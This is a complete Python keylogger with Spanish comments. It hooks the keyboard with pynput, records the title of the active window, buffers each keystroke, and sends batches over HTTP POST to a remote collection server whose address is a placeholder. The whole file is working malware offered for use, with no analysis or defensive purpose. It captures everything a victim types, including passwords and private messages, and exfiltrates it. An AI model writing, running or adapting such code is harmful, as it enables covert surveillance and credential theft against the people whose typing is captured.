try:
    import requests
except ImportError:
    # Implementación mínima de respaldo si requests no está instalado
    import urllib.request as _urllib_request
    import urllib.error as _urllib_error
    import json as _json

    class RequestException(Exception):
        pass

    class _Response:
        def __init__(self, status_code, text):
            self.status_code = status_code
            self.text = text

    class _RequestsModule:
        exceptions = type('E', (), {'RequestException': RequestException})

        @staticmethod
        def post(url, json=None, timeout=None):
            data = None
            headers = {'Content-Type': 'application/json'}
            if json is not None:
                data = _json.dumps(json).encode('utf-8')
            req = _urllib_request.Request(url, data=data, headers=headers, method='POST')
            try:
                with _urllib_request.urlopen(req, timeout=timeout) as resp:
                    body = resp.read().decode('utf-8', errors='ignore')
                    return _Response(resp.getcode(), body)
            except _urllib_error.HTTPError as e:
                try:
                    body = e.read().decode('utf-8', errors='ignore')
                except:
                    body = ''
                return _Response(e.code, body)
            except Exception as e:
                raise RequestException(e)

    requests = _RequestsModule()

import json
from pynput import keyboard
import time
import threading

# --- CONFIGURACIÓN ---
SERVER_URL = "http://<IP-DEL-SERVIDOR>:5000/log"

# Variables de estado global
current_window = "Inicio"
log_buffer = []

def get_active_window_title():
    """Obtiene el título de la ventana activa."""
    try:
        import ctypes
        GetForegroundWindow = ctypes.windll.user32.GetForegroundWindow
        GetWindowTextLength = ctypes.windll.user32.GetWindowTextLengthW
        GetWindowText = ctypes.windll.user32.GetWindowTextW
        hwnd = GetForegroundWindow()
        length = GetWindowTextLength(hwnd)
        buff = ctypes.create_unicode_buffer(length + 1)
        GetWindowText(hwnd, buff, length + 1)
        return buff.value if buff.value else "Desconocido"
    except:
        return "Desconocido/Linux"

def send_log():
    """Envía el buffer actual al servidor."""
    global log_buffer, current_window
    
    if not log_buffer:
        return

    # Creamos una copia de los datos para enviar y limpiamos el buffer original
    # Esto evita problemas si el usuario escribe mientras se envía
    data_to_send = "".join(log_buffer)
    window_title = current_window
    log_buffer = [] # Limpiar buffer

    payload = {
        "window_title": window_title,
        "keystrokes": data_to_send
    }

    print(f"[*] Enviando datos de: {window_title}...") # Debug local

    try:
        response = requests.post(SERVER_URL, json=payload, timeout=5)
        # Código 200 o 201 indican éxito
        if 200 <= response.status_code < 300:
            print(" -> Log enviado con éxito.")
        else:
            print(f" -> Error del servidor: {response.status_code}")
    except requests.exceptions.RequestException as e:
        print(f" -> Error de conexión (Servidor caído?): {e}")

def on_press(key):
    global current_window, log_buffer

    # 1. Verificar si cambió la ventana
    new_window = get_active_window_title()
    if new_window != current_window:
        # Si cambió la ventana, enviamos lo que teníamos de la anterior
        if log_buffer:
            send_log()
        current_window = new_window

    # 2. Procesar la tecla presionada
    key_char = ""
    try:
        # Teclas alfanuméricas
        key_char = key.char
    except AttributeError:
        # Teclas especiales
        if key == keyboard.Key.space:
            key_char = " "
        elif key == keyboard.Key.enter:
            key_char = "\n"
        elif key == keyboard.Key.backspace:
            key_char = " [BACK] "
        else:
            # Ignorar otras teclas especiales o guardarlas como texto
            # key_char = f" [{str(key)}] " 
            pass

    if key_char:
        log_buffer.append(key_char)

    # 3. Opcional: Enviar automáticamente si el buffer es muy grande
    if len(log_buffer) >= 50:
        send_log()

# --- INICIO DEL PROGRAMA ---
print(f"Keylogger iniciado. Apuntando a: {SERVER_URL}")
current_window = get_active_window_title()

# Iniciar el listener del teclado
with keyboard.Listener(on_press=on_press) as listener:
    listener.join()